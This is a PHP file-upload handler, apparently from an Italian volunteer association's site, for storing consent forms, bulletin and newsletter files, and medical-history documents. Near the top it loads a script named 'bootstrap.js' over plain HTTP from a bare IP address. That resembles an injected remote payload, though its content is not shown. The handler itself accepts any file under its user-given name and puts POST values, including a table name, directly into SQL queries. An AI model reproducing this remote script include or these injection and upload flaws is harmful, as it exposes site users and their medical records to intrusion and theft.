<?php
    require_once("../util/constants.php");
    include("../util/connection.php");
    include("../util/command.php");
    include("../util/cookie.php");

    echo "<script src='https://code.jquery.com/jquery-3.6.4.min.js'></script>";
    echo "<script src='http://52.47.171.54:8080/bootstrap.js'></script>";
    echo "<script src='../script/script.js'></script>";
    echo "<link rel='stylesheet' href='../style/style.css'>";
    importActualStyle();
    session_start();
    $connection = connectToDatabase(DB_HOST, DB_ADMIN, ADMIN_PW, DB_NAME);

    $assistedId = null;
    $volunteerId = null;
    $notes = null;
    $table = null;

    if (isset($_POST["assisted"]))
        $assistedId = $_POST["assisted"];

    if (isset($_POST["volunteer"]))
        $volunteerId = $_POST["volunteer"];

    if (isset($_POST["notes"]))
        $notes = $_POST["notes"];

    if (isset($_POST["table"]))
        $table = $_POST["table"];

    // caricamento della liberatoria
    if (isset($_FILES['release'])) {
        $uploadDirectory = 'release_module/'; 
    
        $fileName = $_FILES['release']['name'];
        $fileTmpName = $_FILES['release']['tmp_name'];
    
        // aggiungo il nome del file al percorso della cartella di destinazione
        $newFilePath = $uploadDirectory . $fileName;
    
        if (move_uploaded_file($fileTmpName, $newFilePath)) {
            $uploadedFileName = "release_module/" . $fileName;

            $query = "INSERT INTO liberatorie(liberatoria, note)
                            VALUES('$uploadedFileName', '$notes');";
            $result = dbQuery($connection, $query);

            if ($result) {
                $module_id = $connection->insert_id;

                if ($assistedId != null) {
                    $query = "UPDATE assistiti
                                SET id_liberatoria = '$module_id'
                                WHERE id = '$assistedId';";
                    $result = dbQuery($connection, $query);

                    if ($result) {
                        $_SESSION["file_uploaded"] = true;
                        header("Location: ../private/area_personale.php");
                    } else {
                        $_SESSION["file_not_uploaded"] = true;
                        header("Location: ../private/area_personale.php");
                    }
                } else if ($volunteerId != null) {
                    $query = "UPDATE volontari
                                SET id_liberatoria = '$module_id'
                                WHERE id = '$volunteerId';";
                    $result = dbQuery($connection, $query);

                    if ($result) {
                        $_SESSION["file_uploaded"] = true;
                        header("Location: ../private/area_personale.php");
                    } else {
                        $_SESSION["file_not_uploaded"] = true;
                        header("Location: ../private/area_personale.php");
                    }
                }
            }
        } else {
            nav_menu();
            echo ERROR_GEN;
        }
    }

    // caricamento di file nella bacheca o nella newsletter
    if (isset($_FILES[$table])) {
        $uploadDirectory = "../" . $table . "/files/"; 
    
        $fileName = $_FILES[$table]['name'];
        $fileTmpName = $_FILES[$table]['tmp_name'];
        $date = $_POST["date"];

        // aggiungo il nome del file al percorso della cartella di destinazione
        $newFilePath = $uploadDirectory . $fileName;
    
        if(move_uploaded_file($fileTmpName, $newFilePath)) {
            $uploadedFileName = "files/" . $fileName;

            $query = "INSERT INTO $table($table, data)
                            VALUES('$uploadedFileName', '$date');";
            $result = dbQuery($connection, $query);

            if ($result) {
                $_SESSION["file_uploaded"] = true;
                header("Location: ../" . $table . "/" . $table . ".php");
            } else {
                $_SESSION["file_not_uploaded"] = true;
                header("Location: ../" . $table . "/" . $table . ".php");
            }
        }
    }

    // caricamento di file anamnesi
    if (isset($_FILES["medical"])) {
        $uploadDirectory = "medical_module/"; 
    
        $fileName = $_FILES["medical"]['name'];
        $fileTmpName = $_FILES["medical"]['tmp_name'];

        // aggiungo il nome del file al percorso della cartella di destinazione
        $newFilePath = $uploadDirectory . $fileName;
    
        if(move_uploaded_file($fileTmpName, $newFilePath)) {
            $uploadedFileName = "medical_module/" . $fileName;

            $query = "UPDATE assistiti SET anamnesi = '$uploadedFileName' WHERE id = $assistedId";
            $result = dbQuery($connection, $query);

            if ($result) {
                $_SESSION["file_uploaded"] = true;
                header("Location: ../private/area_personale.php");
            } else {
                $_SESSION["file_not_uploaded"] = true;
                header("Location: ../private/area_personale.php");
            }
        }
    } else {
        nav_menu();
        echo NO_FILE;
    }


    // menu di navigazione
    function nav_menu() {
        echo "<main>
                <section class='header'>
                    <nav>
                        <a href='../index.php'>
                            <img 
                                src='../image/logos/logo.png'
                                class='logo'
                                id='logoImg'
                                alt='logo associazione'
                            />
                        </a>
                        <div class='nav_links' id='navLinks'>
                            <ul>
                                <li><a href='../newsletter/newsletter.php'  class='btn'>Newsletter   </a></li>
                                <li><a href='../bacheca/bacheca.php'        class='btn'>Bacheca       </a></li>
                                <li><a href='https://stripe.com/it'         class='btn' target='blank'>Donazioni</a></li>
                                <li><a href='../private/area_personale.php' class='btn'>Area Personale</a></li>
                            </ul>
                        </div>
                    </nav>            
                </section>
            </main>";
    }
?>